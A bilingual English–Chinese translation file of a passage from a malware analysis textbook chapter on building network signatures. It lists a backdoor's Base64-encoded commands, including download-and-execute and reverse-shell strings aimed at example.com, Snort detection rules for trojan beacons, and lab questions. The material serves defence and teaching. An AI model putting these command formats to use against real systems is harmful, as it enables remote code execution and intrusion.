- en: Sleep for 1 hour
  id: totrans-0
  prefs: []
  type: TYPE_NORMAL
  zh: 睡眠 1 小时
- en: superlongsleep
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: superlongsleep
- en: c3VwZXJsb25nc2xlZXA=
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: c3VwZXJsb25nc2xlZXA=
- en: Sleep for 24 hours
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 睡眠 24 小时
- en: shortsleep
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: shortsleep
- en: c2hvcnRzbGVlcA==
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: c2hvcnRzbGVlcA==
- en: Sleep for 1 minute
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: 睡眠 1 分钟
- en: run:www.example.com/fast.exe
  id: totrans-7
  prefs: []
  type: TYPE_NORMAL
  zh: run:www.example.com/fast.exe
- en: cnVuOnd3dy5leGFtcGxlLmNvbS9mYXN0LmV4ZQ==
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: cnVuOnd3dy5leGFtcGxlLmNvbS9mYXN0LmV4ZQ==
- en: Download and execute a binary
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 下载并执行二进制文件
- en: on the local system
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 在本地系统上
- en: connect:www.example.com:80
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: connect:www.example.com:80
- en: Y29ubmVjdDp3d3cuZXhhbXBsZS5jb206ODA=
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: Y29ubmVjdDp3d3cuZXhhbXBsZS5jb206ODA=
- en: Use a custom protocol to establish
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 使用自定义协议建立
- en: a reverse shell
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 反弹壳
- en: Malware-Focused Network Signatures
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 针对恶意软件的网络签名
- en: '**319**'
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: '**319**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'One approach to creating signatures for this backdoor is to target the full
    set of commands known to be used by the malware (including the surrounding context).
    Content expressions for the five commands recognized by the malware would contain
    the following strings:'
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 为此后门创建签名的一种方法是对已知由恶意软件使用的全部命令集进行目标定位（包括周围上下文）。恶意软件识别的五个命令的内容表达式将包含以下字符串：
- en: <!-- adsrv?bG9uZ3NsZWVw -->
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: <!-- adsrv?bG9uZ3NsZWVw -->
- en: <!-- adsrv?c3VwZXJsb25nc2xlZXA= -->
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: <!-- adsrv?c3VwZXJsb25nc2xlZXA= -->
- en: <!-- adsrv?c2hvcnRzbGVlcA== -->
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: <!-- adsrv?c2hvcnRzbGVlcA== -->
- en: <!-- adsrv?cnVu
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: <!-- adsrv?cnVu
- en: <!-- adsrv?Y29ubmVj
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: <!-- adsrv?Y29ubmVj
- en: The last two expressions target only the static part of the commands (run and
    connect), and since the length of the argument is not known, they do not target
    the trailing comment characters (-->).
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 最后两个表达式仅针对命令的静态部分（运行和连接），由于参数长度未知，它们不会针对尾随注释字符（-->）。
- en: While signatures that use all of these elements will likely find this precise
    piece of malware, there is a risk of being too specific at the expense of robust-ness.
    If the attacker changes any part of the malware—the command set, the encoding,
    or the command prefix—a very precise signature will cease to be effective.
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然使用所有这些元素的签名可能会找到这种精确的恶意软件，但过于具体可能会牺牲鲁棒性。如果攻击者更改恶意软件的任何部分——命令集、编码或命令前缀——一个非常精确的签名将不再有效。
- en: '***Targeting Multiple Elements***'
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: '***针对多个元素***'
- en: Previously, we saw that different parts of the command interpretation were in
    different parts of the code. Given that knowledge, we can create different signatures
    to target the various elements separately.
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 之前，我们看到了命令解释的不同部分位于代码的不同部分。基于这些知识，我们可以创建不同的签名来分别针对不同的元素。
- en: The three elements that appear to be in distinct functions are comment bracketing,
    the fixed adsrv? with a Base64 expression following, and the actual command parsing.
    Based on these three elements, a set of signature elements could include the following
    (for brevity, only the primary elements of each signature are included, with each
    line representing a different signature).
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 看起来位于不同函数中的三个元素是注释括号、固定的 adsrv? 后跟 Base64 表达式，以及实际的命令解析。基于这三个元素，一组签名元素可能包括以下内容（为了简洁，只包括每个签名的主体元素，每行代表一个不同的签名）。
- en: pcre:"/<!-- adsrv\?([a-zA-Z0-9+\/=]{4})+ -->/"
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: pcre:"/<!-- adsrv\?([a-zA-Z0-9+\/=]{4})+ -->/"
- en: 'content:"<!-- "; content:"bG9uZ3NsZWVw -->"; within:100; content:"<!-- "; content:"c3VwZXJsb25nc2xlZXA=
    -->"; within:100; content:"<!-- "; content:"c2hvcnRzbGVlcA== -->"; within:100;
    content:"<!-- "; content:"cnVu";within:100;content: "-->"; within:100; content:"<!--
    "; content:"Y29ubmVj"; within:100; content:"-->"; within:100; These signatures
    target the three different elements that make up a command being sent to the malware.
    All include the comment bracketing.'
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 'content:"<!-- "; content:"bG9uZ3NsZWVw -->"; within:100; content:"<!-- "; content:"c3VwZXJsb25nc2xlZXA=
    -->"; within:100; content:"<!-- "; content:"c2hvcnRzbGVlcA== -->"; within:100;
    content:"<!-- "; content:"cnVu";within:100;content: "-->"; within:100; content:"<!--
    "; content:"Y29ubmVj"; within:100; content:"-->"; within:100; 这些签名针对组成发送给恶意软件的命令的三个不同元素。所有这些都包括注释括号。'
- en: The first signature targets the command prefix adsrv? followed by a generic
    Base64-encoded command. The rest of the signatures target a known Base64-encoded
    command without any dependency on a command prefix.
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 第一个签名针对命令前缀 adsrv? 后跟一个通用的 Base64 编码命令。其余的签名针对一个已知的 Base64 编码命令，不依赖于任何命令前缀。
- en: Since we know the parsing occurs in a separate section of the code, it makes
    sense to target it independently. If the attacker changes one part of the code
    or the other, our signatures will still detect the unchanged part.
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 由于我们知道解析发生在代码的独立部分，因此独立定位它是合理的。如果攻击者更改代码的一部分或另一部分，我们的签名仍然可以检测到未更改的部分。
- en: Note that we are still making assumptions. The new signatures may be more prone
    to false positives. We are also assuming that the attacker will most likely continue
    to use comment bracketing, since comment bracketing is a part of regular web communications
    and is unlikely to be considered **320**
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 注意，我们仍在做出假设。新的签名可能更容易产生误报。我们还假设攻击者最有可能继续使用注释括号，因为注释括号是常规网络通信的一部分，不太可能被考虑为**320**
- en: Chapter 14
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 第14章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: suspicious. Nevertheless, this strategy provides more robust coverage than our
    initial attempt and is more likely to detect future variants of the malware.
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 可疑。尽管如此，这种策略比我们最初的尝试提供了更稳健的覆盖范围，并且更有可能检测到恶意软件的未来变体。
- en: 'Let’s revisit the signature we created earlier for beacon traffic. Recall that
    we combined every possible element into the same signature: alert tcp $HOME_NET
    any -> $EXTERNAL_NET $HTTP_PORTS (msg:"TROJAN Malicious Beacon "; content:"User-Agent:
    Mozilla/4.0 (compatible\; MSIE 7.0\; Windows NT 5.1)"; content:"Accept: * / *";
    uricontent:"58"; content:!"|0d0a|referer:"; nocase; pcre:"/GET \/([12]{0,1}[0-9]{1,2}){4}58[0-9]{6,9}58(4[89]|5[0-7]|9[789]|10
    [012]){8} HTTP/"; classtype:trojan-activity; sid:2000002; rev:1;)'
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: '让我们回顾一下我们之前为信标流量创建的签名。回想一下，我们将每个可能元素都组合到同一个签名中：alert tcp $HOME_NET any -> $EXTERNAL_NET
    $HTTP_PORTS (msg:"TROJAN Malicious Beacon "; content:"User-Agent: Mozilla/4.0
    (compatible\; MSIE 7.0\; Windows NT 5.1)"; content:"Accept: * / *"; uricontent:"58";
    content:!"|0d0a|referer:"; nocase; pcre:"/GET \/([12]{0,1}[0-9]{1,2}){4}58[0-9]{6,9}58(4[89]|5[0-7]|9[789]|10
    [012]){8} HTTP/"; classtype:trojan-activity; sid:2000002; rev:1;)'
- en: 'This signature has a limited scope and would become useless if the attacker
    made any changes to the malware. A way to address different elements individually
    and avoid rapid obsolescence is with these two targets:'
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 这个签名的作用范围有限，如果攻击者对恶意软件进行了任何更改，它将变得无用。通过这些两个目标分别处理不同的元素，可以避免快速过时：
- en: 
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: 'Target 1: User-Agent string, Accept string, no referrer'
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 目标1：用户代理字符串，接受字符串，无引用者
- en: 
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: 'Target 2: Specific URI, no referrer'
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 目标2：特定的URI，无引用者
- en: 'This strategy would yield two signatures:'
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 这种策略会产生两个签名：
- en: 'alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"TROJAN Malicious
    Beacon UA with Accept Anomaly"; content:"User-Agent: Mozilla/4.0 (compatible\;
    MSIE 7.0\; Windows NT 5.1)"; content:"Accept: * / *"; content:!"|0d0a|referer:";
    nocase; classtype:trojan-activity; sid:2000004; rev:1;)'
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 'alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"TROJAN Malicious
    Beacon UA with Accept Anomaly"; content:"User-Agent: Mozilla/4.0 (compatible\;
    MSIE 7.0\; Windows NT 5.1)"; content:"Accept: * / *"; content:!"|0d0a|referer:";
    nocase; classtype:trojan-activity; sid:2000004; rev:1;)'
- en: 'alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"TROJAN Malicious
    Beacon URI"; uricontent:"58"; content:!"|0d0a|referer:"; nocase; pcre:'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 'alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"TROJAN Malicious
    Beacon URI"; uricontent:"58"; content:!"|0d0a|referer:"; nocase; pcre:'
- en: '"/GET \/([12]{0,1}[0-9]{1,2}){4}58[0-9]{6,9}58(4[89]|5[0-7]|9[789]|10[012]){8}
    HTTP/"; classtype:trojan-activity; sid:2000005; rev:1;)'
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: '"/GET \/([12]{0,1}[0-9]{1,2}){4}58[0-9]{6,9}58(4[89]|5[0-7]|9[789]|10[012]){8}
    HTTP/"; classtype:trojan-activity; sid:2000005; rev:1;)'
- en: '**Understanding the Attacker’s Perspective**'
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: '**理解攻击者的视角**'
- en: When designing a signature strategy, it’s wise to try to understand the attacker’s
    perspective. Attackers are playing a constant game of cat-and-mouse. Their intent
    is to blend in with regular traffic to avoid detection and maintain successful
    ongoing operations. Like any software developers, attackers struggle to update
    software, to remain current and compatible with changing systems. Any changes
    that are necessary should be minimal, as large changes can threaten the integrity
    of their systems.
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 设计签名策略时，试图理解攻击者的视角是明智的。攻击者正在玩一场持续的猫捉老鼠游戏。他们的意图是融入常规流量以避免检测并维持成功的持续操作。像任何软件开发者一样，攻击者努力更新软件，以保持与不断变化的系统的兼容性。任何必要的更改都应该是最小的，因为大的更改可能会威胁到他们系统的完整性。
- en: As previously discussed, using multiple signatures that target different parts
    of the malicious code makes detection more resilient to attacker modifications.
    Often, attackers will change their software slightly to avoid detection by a specific
    signature. By creating multiple signatures that key off of different aspects of
    the communication, you can still successfully detect the malware, even if the
    attacker has updated a portion of the code.
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所述，使用针对恶意代码不同部分的多个签名可以使检测对攻击者的修改更具弹性。通常，攻击者会稍微修改他们的软件以避免特定签名的检测。通过创建基于通信不同方面的多个签名，即使攻击者更新了代码的一部分，你仍然可以成功检测到恶意软件。
- en: 'Here are three additional rules of thumb that you can use to take advantage
    of attacker weaknesses:'
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 这里有三条额外的经验法则，你可以利用攻击者的弱点：
- en: '**Focus on elements of the protocol that are part of both end points.**'
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: '**关注协议中属于两个端点的元素**。'
- en: Changing either the client code or the server code alone is much easier than
    changing both. Look for elements of the protocol that use code at Malware-Focused
    Network Signatures
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 仅更改客户端代码或服务器代码比同时更改两者要容易得多。寻找协议中使用代码的元素。
- en: '**321**'
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: '**321**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: both the client and server side, and create a signature based on these elements.
    The attacker will need to do a lot of extra work to render such a signature obsolete.
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端和服务器端都需要，并基于这些元素创建一个签名。攻击者需要做很多额外的工作才能使这样的签名失效。
- en: '**Focus on any elements of the protocol known to be part of a key.**'
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: '**关注已知属于密钥的任何协议元素**。'
- en: Often, some hard-coded components of a protocol are used as a key. For example,
    an attacker may use a specific User-Agent string as an authentication key so that
    illegitimate probing can be detected (and possibly rerouted). In order for an
    attacker to bypass such a signature, he would need to change code at both end
    points.
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 通常，协议中的一些硬编码组件被用作密钥。例如，攻击者可能使用特定的User-Agent字符串作为认证密钥，以便检测非法探测（并可能重新路由）。为了绕过这样的签名，攻击者需要在两个端点更改代码。
- en: '**Identify elements of the protocol that are not immediately apparent in traffic.**'
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: '**识别在流量中不明显协议元素**。'
- en: Sometimes, the simultaneous actions of multiple defenders can impede the detection
    of malware. If another defender creates a signature that achieves sufficient success
    against an attacker, the attacker may be com-pelled to adjust his malware to avoid
    the signature. If you are relying on the same signature, or a signature that targets
    the same aspects of the attacker’s communication protocol, the attacker’s adjustment
    will affect your signature as well. In order to avoid being rendered obsolete
    by the attacker’s response to another defender, try to identify aspects of malicious
    operations that other defenders might not have focused on. Knowledge gained from
    carefully observing the malware will help you develop a more robust signature.
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 有时，多个防御者的同时行动可能会妨碍恶意软件的检测。如果另一个防御者创建了一个能够对攻击者取得足够成功的签名，攻击者可能被迫调整其恶意软件以避免该签名。如果你依赖于相同的签名，或者一个针对攻击者通信协议相同方面的签名，攻击者的调整也会影响你的签名。为了避免被其他防御者的响应所淘汰，尝试识别其他防御者可能没有关注的恶意操作方面。从仔细观察恶意软件中获得的知识将帮助你开发一个更健壮的签名。
- en: '**Conclusion**'
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: '**结论**'
- en: In this chapter, we’ve described the way in which malware uses the network for
    command and control. We’ve also covered some of the techniques malware uses to
    disguise its activity to look like regular network traffic. Malware analysis can
    improve the effectiveness of network defense by providing insights into the signature-generation
    process.
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们描述了恶意软件如何使用网络进行命令和控制。我们还介绍了恶意软件用来伪装其活动以看起来像常规网络流量的技术。通过提供关于签名生成过程的见解，恶意软件分析可以提高网络防御的有效性。
- en: We’ve described several advantages to basing network signatures on a deeper
    malware analysis, rather than a surface analysis of existing traffic captures
    or a sandbox-based analysis. Signatures based on malware analysis can be more
    precise, reducing the trial and error needed to produce low false-positive signatures.
    Additionally, they have a higher likelihood of identifying new strains of the
    same malware.
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经描述了基于更深入的恶意软件分析来建立网络签名的好处，而不是基于现有流量捕获的表面分析或基于沙箱的分析。基于恶意软件分析的签名可以更精确，减少产生低误报签名的试错过程。此外，它们更有可能识别出同一恶意软件的新变种。
- en: 'This chapter has addressed what is often the endgame of basic malware analysis:
    development of an effective countermeasure to protect from future malware. However,
    this chapter assumes that it is possible to achieve a good understanding of the
    malware through dynamic and static analyses. In some cases, malware authors take
    active measures to prevent effective analysis. The next set of chapters explain
    the techniques malware authors use to stymie analysis and what steps you can take
    to ensure that you can fully decompose and understand the malware in question.'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 本章已经讨论了基本恶意软件分析通常的最终目标：开发有效的对策来保护免受未来恶意软件的侵害。然而，本章假设可以通过动态和静态分析对恶意软件有一个很好的理解。在某些情况下，恶意软件作者会采取积极措施来防止有效的分析。下一组章节将解释恶意软件作者用来阻碍分析的技术，以及你可以采取哪些步骤来确保你可以完全分解和理解所讨论的恶意软件。
- en: '**322**'
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: '**322**'
- en: Chapter 14
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 第14章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**L A B S**'
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: '**L A B S**'
- en: This chapter’s labs focus on identifying the networking components of malware.
    To some degree, these labs build on Chapter 13, since when developing network
    signatures, you’ll often need to deal with encoded content.
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 本章的实验重点在于识别恶意软件的网络组件。在某种程度上，这些实验建立在第13章的基础上，因为当开发网络签名时，你通常会需要处理编码内容。
- en: '**Lab 14-1**'
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验 14-1**'
- en: Analyze the malware found in file *Lab14-01.exe*. This program is not harmful
    to your system.
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 分析文件 *Lab14-01.exe* 中发现的恶意软件。此程序对您的系统无害。
- en: '***Questions***'
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: '***问题***'
- en: 1\.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: Which networking libraries does the malware use, and what are their advantages?
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件使用了哪些网络库，它们有什么优势？
- en: 2\.
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: What source elements are used to construct the networking beacon, and what conditions
    would cause the beacon to change?
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 构建网络信标所使用的源元素是什么，以及什么条件会导致信标发生变化？
- en: 3\.
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: Why might the information embedded in the networking beacon be of interest to
    the attacker?
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 为什么嵌入在网络信标中的信息可能对攻击者感兴趣？
- en: 4\.
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: Does the malware use standard Base64 encoding? If not, how is the encoding unusual?
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件使用标准的Base64编码吗？如果不是，编码有什么不寻常之处？
- en: 5\.
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: What is the overall purpose of this malware?
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 这种恶意软件的整体目的是什么？
- en: 6\.
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: What elements of the malware’s communication may be effectively detected using
    a network signature?
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 使用网络签名可以有效地检测恶意软件通信的哪些元素？
- en: 7\.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: '7.'
- en: What mistakes might analysts make in trying to develop a signature for this
    malware?
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 分析师在尝试为这种恶意软件开发签名时可能会犯哪些错误？
- en: 8\.
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: '8.'
- en: What set of signatures would detect this malware (and future variants)?
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 哪套签名可以检测这种恶意软件（以及未来的变种）？
- en: '**Lab 14-2**'
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验 14-2**'
- en: Analyze the malware found in file *Lab14-02.exe*. This malware has been configured
    to beacon to a hard-coded loopback address in order to prevent it from harming
    your system, but imagine that it is a hard-coded external address.
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 分析文件 *Lab14-02.exe* 中发现的恶意软件。此恶意软件已被配置为向硬编码的回环地址信标，以防止它损害您的系统，但想象一下，它是一个硬编码的外部地址。
- en: '***Questions***'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: '***问题***'
- en: 1\.
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: What are the advantages or disadvantages of coding malware to use direct IP
    addresses?
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 将恶意软件编码为使用直接IP地址的优势或劣势是什么？
- en: 2\.
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: Which networking libraries does this malware use? What are the advantages or
    disadvantages of using these libraries?
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 这种恶意软件使用了哪些网络库？使用这些库的优势或劣势是什么？
- en: Malware-Focused Network Signatures
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 针对恶意软件的网络签名
- en: '**323**'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: '**323**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 3\.
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: What is the source of the URL that the malware uses for beaconing?
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件用于信标功能的URL的来源是什么？
- en: What advantages does this source offer?
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 这个来源提供了哪些优势？
- en: 4\.
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: Which aspect of the HTTP protocol does the malware leverage to achieve its objectives?
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件利用HTTP协议的哪个方面来实现其目标？
- en: 5\.
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: What kind of information is communicated in the malware’s initial beacon?
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件的初始信标中传达了哪些信息？
- en: 6\.
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: What are some disadvantages in the design of this malware’s communication channels?
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 在设计这种恶意软件的通信渠道时，有哪些缺点？
- en: 7\.
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: '7.'
- en: Is the malware’s encoding scheme standard?
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件的编码方案是否标准？
- en: 8\.
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: '8.'
- en: How is communication terminated?
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 通信是如何终止的？
- en: 9\.
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: '9.'
- en: What is the purpose of this malware, and what role might it play in the attacker’s
    arsenal?
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 这种恶意软件的目的是什么，它可能在攻击者的工具库中扮演什么角色？
- en: '**Lab 14-3**'
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验 14-3**'
- en: This lab builds on Lab 14-1\. Imagine that this malware is an attempt by the
    attacker to improve his techniques. Analyze the malware found in file *Lab14-03.exe*.
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: 这个实验建立在实验14-1的基础上。想象一下，这种恶意软件是攻击者试图改进其技术的尝试。分析文件 *Lab14-03.exe* 中发现的恶意软件。
- en: '***Questions***'
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: '***问题***'
- en: 1\.
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: What hard-coded elements are used in the initial beacon? What elements, if any,
    would make a good signature?
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 初始信标中使用了哪些硬编码元素？如果有的话，哪些元素可以作为一个好的签名？
- en: 2\.
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: 2\.
- en: What elements of the initial beacon may not be conducive to a long-lasting signature?
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 初始信标中哪些元素可能不利于持久签名？
- en: 3\.
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 3\.
- en: How does the malware obtain commands? What example from the chapter used a similar
    methodology? What are the advantages of this technique?
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件是如何获取命令的？本章中使用了类似方法的例子是什么？这种技术的优点是什么？
- en: 4\.
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 4\.
- en: When the malware receives input, what checks are performed on the input to determine
    whether it is a valid command? How does the attacker hide the list of commands
    the malware is searching for?
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: 当恶意软件接收输入时，会对输入进行哪些检查以确定它是否是有效的命令？攻击者是如何隐藏恶意软件正在搜索的命令列表的？
- en: 5\.
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 5\.
- en: What type of encoding is used for command arguments? How is it different from
    Base64, and what advantages or disadvantages does it offer?
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: 命令参数使用了哪种编码类型？它与Base64有何不同，它提供了哪些优点或缺点？
- en: 6\.
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 6\.
- en: What commands are available to this malware?
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: 这种恶意软件有哪些可用的命令？
- en: 7\.
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: 7\.
- en: What is the purpose of this malware?
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: 这种恶意软件的目的是什么？
- en: 8\.
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 8\.
- en: This chapter introduced the idea of targeting different areas of code with independent
    signatures (where possible) in order to add resiliency to network indicators.
    What are some distinct areas of code or configuration data that can be targeted
    by network signatures?
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 本章介绍了针对代码的不同区域使用独立签名（如果可能）的想法，以增加网络指示器的弹性。可以针对哪些独特的代码或配置数据区域使用网络签名？
- en: 9\.
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 9\.
- en: What set of signatures should be used for this malware?
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: 应该使用哪一套签名来应对这种恶意软件？
- en: '**324**'
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: '**324**'
- en: Chapter 14
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 第14章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**PART 5**'
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: '**第5部分**'
- en: '**A N T I - R E V E R S E - E N G I N E E R I N G**'
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: '**反逆向工程**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
